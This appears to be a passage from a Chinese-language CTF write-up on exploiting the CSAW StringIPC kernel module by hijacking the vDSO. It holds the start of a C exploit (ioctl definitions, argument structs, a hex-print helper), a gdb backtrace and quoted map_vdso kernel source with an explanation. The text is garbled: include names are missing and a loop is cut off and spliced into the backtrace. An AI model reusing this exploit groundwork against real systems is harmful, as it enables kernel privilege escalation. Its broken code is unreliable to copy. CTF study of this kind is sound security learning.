                           |           |                                               |+++++++++++++|
                           |           |                                               |+++++++++++++|
                           |           |                                               |+++++++++++++|
                           |           |                                               |+++++++++++++|
                           |           |                                               |+++++++++++++|
                           |           |                                               |+++++++++++++|
                           |           |                                               |+++++++++++++|
        64T                |           | direct mapping of all phys. memory            |+++++++++++++|
                           |           | (1 
    #include        
    #include 
    #include 
    #include 
    #include 
    #define CSAW_IOCTL_BASE     0x77617363
    #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
    #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
    #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
    #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
    #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
    #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
    #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
    #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
    struct alloc_channel_args {
        size_t buf_size;
        int id;
    };
    struct open_channel_args {
        int id;
    };
    struct shrink_channel_args {
        int id;
        size_t size;
    };
    struct read_channel_args {
        int id;
        char *buf;
        size_t count;
    };
    struct write_channel_args {
        int id;
        char *buf;
        size_t count;
    };
    struct seek_channel_args {
        int id;
        loff_t index;
        int whence;
    };
    struct close_channel_args {
        int id;
    };
    void print_hex(char *buf,size_t len){
        int i ;
        for(i = 0;i, calculate_addr=) at arch/x86/entry/vdso/vma.c:151
    #2  0xffffffff81004267 in arch_setup_additional_pages (bprm=, uses_interp=) at arch/x86/entry/vdso/vma.c:209
    #3  0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080
    #4  0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469
在map_vdso中首先查找到一块用户态地址，将该块地址设置为VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用remap_pfn_range将内核页映射过去。
    static int map_vdso(const struct vdso_image *image, bool calculate_addr)
    {
        struct mm_struct *mm = current->mm;
        struct vm_area_struct *vma;
        unsigned long addr, text_start;
        int ret = 0;
        static struct page *no_pages[] = {NULL};
        static struct vm_special_mapping vvar_mapping = {
            .name = "[vvar]",
            .pages = no_pages,
        };
        struct pvclock_vsyscall_time_info *pvti;
        if (calculate_addr) {
            addr = vdso_addr(current->mm->start_stack,
                     image->size - image->sym_vvar_start);
        } else {
            addr = 0;
        }
        down_write(&mm->mmap_sem);
        addr = get_unmapped_area(NULL, addr,
                     image->size - image->sym_vvar_start, 0, 0);
        if (IS_ERR_VALUE(addr)) {